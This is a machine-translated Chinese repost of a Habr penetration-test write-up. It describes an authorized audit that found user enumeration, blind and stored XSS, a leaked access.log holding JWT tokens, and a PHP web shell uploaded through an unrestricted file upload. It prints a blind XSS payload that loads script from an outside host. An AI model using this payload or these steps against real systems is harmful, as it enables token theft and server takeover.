<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>😹 🎬 💇 从普通用户到正式的服务器管理员（XSS，LFI，Web Shell） 🧔🏻 👩🏽‍⚕️ 🏵️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="年初，一家公司的一名员工写信给我。 据我了解，该公司存在一个小冲突。 因此，某些员工可能会损害系统。 审核系统的决定绝对是正确的决定。 毕竟，检查的结果使我感到惊喜，而“令人不愉快的”使顾客感到惊讶。 

 系统架构原则上是标准的。 它基于身份验证服务。 此外，根据jwt发行的令牌，用户可以在各个子...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>从普通用户到正式的服务器管理员（XSS，LFI，Web Shell）</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/452854/"><img src="https://habrastorage.org/webt/pc/sr/se/pcsrseauno875cmhmbms8odj33e.jpeg"><br><br> 年初，一家公司的一名员工写信给我。 据我了解，该公司存在一个小冲突。 因此，某些员工可能会损害系统。 审核系统的决定绝对是正确的决定。 毕竟，检查的结果使我感到惊喜，而“令人不愉快的”使顾客感到惊讶。 <br><a name="habracut"></a><br> 系统架构原则上是标准的。 它基于身份验证服务。 此外，根据jwt发行的令牌，用户可以在各个子域上使用系统的功能。 <br><br> 测试仅限于一个子域。 但最基本的根据客户。 我不会详细说明所有错误和问题。 他们被发现了很多。 我只会描述那些对我来说最奇怪的东西。 <br><br><h2> 搜索用户时的信息冗余 </h2><br> 允许用户接收以下性质的信息的搜索查询-用户ID，名称，登录名，头像... <br><img src="https://habrastorage.org/webt/tg/qu/ov/tgquov-poitm1ptfpu0zbeluz80.png"><br> 毫无问题，可以收集Login_name用户的整个数据库。 登录功能也没有特殊限制。 这样就可以在多个流中选择一个密码，或者对系统中最重要的用户执行点网络钓鱼。 <br><br><h2> 要求用户支持的XSS盲目。 </h2><br> 我得到的印象是，我遇到的系统中有90％存在此问题。 早些时候，来自平台的用于汇总评论的“混蛋”一再向我飞来。 对Internet上的用户行为监视系统的访问也大量涌入。 有很多东西。 但是，很少有人知道这有多危险。 具体来说，此漏洞是<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在此处</a>编写的。 <br> 在这种情况下，当我收到<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">XSS Hunter</a>的通知时，确保攻击是偶然进行的。 攻击媒介如下： <br><br><pre><code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"&gt;&lt;script src=https://sa.xss.ht&gt;&lt;/script&gt;</span></span></code> </pre> <br> 但是客户不相信我可以通过此攻击媒介来控制管理面板。 毕竟，所有有价值的信息都存储在本地存储中。 由于XSS Hunter不支持接收本地存储信息，因此我必须部署自己的XSS记录器。 以下<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">出版物</a>非常有帮助。 通过反复攻击，可以验证是否可以通过恶意手段甚至从本地存储轻松获得管理员的jwt令牌。 <br><img src="https://habrastorage.org/webt/ju/o_/gg/juo_ggzcuntv-w0xpqj8wyrc81s.png"><br><br> 好了，那么有了系统中的管理员权限，您可以执行任何操作。 <br><br><h2> 将XSS存储在电子邮件中。 </h2><br> 在系统中发现了一项功能，该功能使您可以创建带有框架的电子邮件邀请来注册新用户。 您可以在信件形式中输入该人的姓名。 使电子邮件更加个性化。 结果，所有内容都没有逃脱并落入信中。 为了通过信件成功进行类似的xss攻击，您需要了解受害者的电子邮件客户端，并且需要知道此客户端的零日xss。 通常，根据定义，此攻击的成功率可忽略不计。 直到我在信的右上角发现一个好奇的按钮的那一刻。 <br><br><img src="https://habrastorage.org/webt/_9/bc/aw/_9bcawpodb6qbagj8om9k7d0nhc.png"><br><br> 这是打开信件的网络版本的机会。 在这里，一个惊喜在等待着我。 我的XSS工作正常。 同时，该信件的网络版本已在管理员*。Com子域上打开。 <br><br><img src="https://habrastorage.org/webt/rk/nt/gt/rkntgtsisw3mf4oef6dfzc31tbq.png"><br><br> 可以说是双重惊喜。 <br><br><h2> 可用文件access.log </h2><br> 在审核过程中，我找到了一个有趣的地方。 当不同的字符进入请求时，404到达服务器的响应，但周期性地，404响应与前一个稍有不同。 有时会有一个额外的标题。 有时不是。 系统响应中的某种突变促使我检查该位置的本地文件包含（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">LFI</a> ）。 我设置了lfi字典，并等待系统返回所有请求的答案。 结果，当查看测试结果时，我对状态为200且传输的数据非常重要的答案感到非常惊讶。 <br><br><img src="https://habrastorage.org/webt/kl/vc/cw/klvccwx_esjpgpgzbian0kyxd4c.png"><br><br> 原来，我找到了一个可读的文件access.log。 该文件记录了服务器上的所有活动。 包括在该文件中，就有可能检测到jwt用户令牌。 <br><img src="https://habrastorage.org/webt/ld/wy/rs/ldwyrs3tnisd5_jm4sbmcx2dmom.png"><br><br> 这些令牌的到期时间非常长。 而且那也不是很好。 <br><br><h2> 完全通过Web Shell访问服务器 </h2><br> 原则上，以上所有都是常见问题。 但是某些类型的漏洞已经很难满足。 这是关于通过shell.php文件中整齐加载的代码访问服务器。 之后，位于此服务器上的所有项目都将受到威胁。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">Bo0oM</a>于2016年在他的博客中写道。 <br> 但是回到我的例子。 该系统具有发布出版物的能力。 同时，可以上传图片进行发布。 图片已保存在同一域中。 但是文件名被强制更改。 即您上传-mypicture.jpg。 但是结果是，您得到12345.jpg。 我决定检查如果传输xml文件会发生什么情况（当时我显然梦想着见到XXE）。 令我惊讶的是，我得到了答案123556.xml。 然后，我意识到Web Shell的php文件扩展名有99％的成功机会。 对于此攻击，我使用了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">b374k shell</a> 。 通过直接访问文件-我得到了想要的东西。 访问服务器目录。 <br><br><img src="https://habrastorage.org/webt/bt/ik/lf/btiklfakt0wb2gyiwahanzp6k1k.png"><br><br> 但这不是最可悲的事情。 最可悲的是，通过此漏洞，有可能破坏此服务器根目录中的10个以上项目。 <br><br><img src="https://habrastorage.org/webt/o6/tw/cw/o6twcw5jb6vfazbvbhn3lzqivdg.png"><br><br> 我的朋友<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" class="user_link">Cyber​​punkyc</a>说，这可以在2007-2010年看到。  las，在2019年的院子里。今天也存在类似的问题。 <br><br> 经过测试，客户对结果感到非常惊讶。 我很高兴我在测试中非常有用。 如果您对有趣的项目有任何建议，请随时写信给我；） </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN452854/">https://habr.com/ru/post/zh-CN452854/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN452844/index.html">转型还是亵渎：如何“数字化”电信运营商</a></li>
<li><a href="../zh-CN452846/index.html">我们如何在Patroni上构建可靠的PostgreSQL集群</a></li>
<li><a href="../zh-CN452848/index.html">2020年2月1日会发生什么？</a></li>
<li><a href="../zh-CN452850/index.html">卡匣内的系统：工程师如何扩展游戏机的功能</a></li>
<li><a href="../zh-CN452852/index.html">远程工作：晚上的神话</a></li>
<li><a href="../zh-CN452856/index.html">为什么独立项目无法发布</a></li>
<li><a href="../zh-CN452872/index.html">由于我没有准备，所以在莫斯科举行了Rosnanov FPGA研讨会。 计划在拉斯维加斯和泽列诺格勒做同样的事情</a></li>
<li><a href="../zh-CN452876/index.html">UICollectionViewLayout适用于不同一半的披萨</a></li>
<li><a href="../zh-CN452880/index.html">2019年1月-2019年4月引起轰动的用户数据泄漏</a></li>
<li><a href="../zh-CN452882/index.html">客户与Freelancer首次联系时的错误</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>